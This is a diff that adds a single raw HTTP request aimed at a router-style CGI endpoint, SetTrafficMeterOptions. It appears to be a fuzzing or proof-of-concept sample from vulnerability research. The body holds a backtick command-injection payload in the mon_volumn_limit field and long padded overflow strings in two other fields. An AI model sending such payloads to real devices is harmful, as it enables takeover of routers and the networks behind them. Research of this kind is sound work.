@@ -1,0 +1,6 @@
+GET /apply.cgi?SetTrafficMeterOptions HTTP/1.1
+Host: 242
+Content-Type: application/json
+Content-Length: 370
+
+mon_volumn_limit=;`wzq`&restart_counter_time=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa&traffic_restart_day=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa&submit_flag=USB_advanced&%20timestamp='wzq
